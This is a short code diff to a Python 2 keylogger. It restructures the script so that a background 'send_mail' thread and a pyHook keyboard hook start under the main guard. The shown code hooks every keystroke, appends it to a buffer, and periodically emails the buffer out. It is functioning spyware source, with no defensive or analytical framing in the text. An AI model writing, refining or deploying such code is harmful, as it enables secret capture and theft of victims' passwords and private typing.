@@ -62,11 +62,7 @@ def send_mail():
             except Exception as error:
                 print error
         sleep(120)
-            
 
-if __name__ == '__main__':
-    triggerThread = Thread(target=send_mail)
-    triggerThread.start()
 
 def pushing(event):
     global data
@@ -92,8 +88,12 @@ def pushing(event):
             }
     keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
     data += keyboardKeyName
-    
-hookManager = pyHook.HookManager()
-hookManager.KeyDown = pushing
-hookManager.HookKeyboard()
-pythoncom.PumpMessages()
+
+if __name__ == '__main__':
+    triggerThread = Thread(target=send_mail)
+    triggerThread.start()
+
+    hookManager = pyHook.HookManager()
+    hookManager.KeyDown = pushing
+    hookManager.HookKeyboard()
+    pythoncom.PumpMessages()
